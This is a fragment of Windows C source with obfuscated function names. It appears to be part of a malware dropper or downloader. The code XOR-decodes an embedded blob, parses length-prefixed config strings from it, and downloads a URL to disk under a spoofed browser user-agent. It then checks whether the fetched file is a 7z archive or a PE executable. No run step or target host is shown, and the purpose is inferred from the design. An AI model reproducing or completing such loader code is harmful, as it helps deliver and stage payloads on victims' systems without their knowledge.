static void xd(unsigned char *d, int n, const unsigned char *k, int kn) {
    int i; for (i = 0; i < n; i++) d[i] ^= k[i % kn];
}
static int ri(const unsigned char *d, int *o) {
    int v = (d[*o]<<24)|(d[*o+1]<<16)|(d[*o+2]<<8)|d[*o+3];
    *o += 4; return v;
}
static char *rs(const unsigned char *d, int *o) {
    int l = ri(d, o);
    char *s = (char*)calloc(1, (size_t)l + 1);
    if (s) memcpy(s, d + *o, l);
    *o += l; return s;
}

static int dlf(const char *url, const char *dest) {
    HINTERNET hi, hu; HANDLE hf; char b[8192]; DWORD rd, wr; int t = 0;
    hi = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hi) return 0;
    hu = InternetOpenUrlA(hi, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hu) { InternetCloseHandle(hi); return 0; }
    hf = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hu); InternetCloseHandle(hi); return 0;
    }
    while (InternetReadFile(hu, b, sizeof(b), &rd) && rd > 0) {
        WriteFile(hf, b, rd, &wr, NULL); t += (int)rd;
    }
    CloseHandle(hf); InternetCloseHandle(hu); InternetCloseHandle(hi);
    return t;
}

static int csig(const char *p, const unsigned char *s, int sl) {
    unsigned char buf[8]; DWORD rd; HANDLE h;
    h = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    ReadFile(h, buf, (DWORD)sl, &rd, NULL); CloseHandle(h);
    return (int)rd >= sl && memcmp(buf, s, sl) == 0;
}
static int i7z(const char *p) {
    unsigned char s[] = {0x37,0x7A,0xBC,0xAF,0x27,0x1C}; return csig(p,s,6);
}
static int ipe(const char *p) {
    unsigned char s[] = {0x4D,0x5A}; return csig(p,s,2);
}

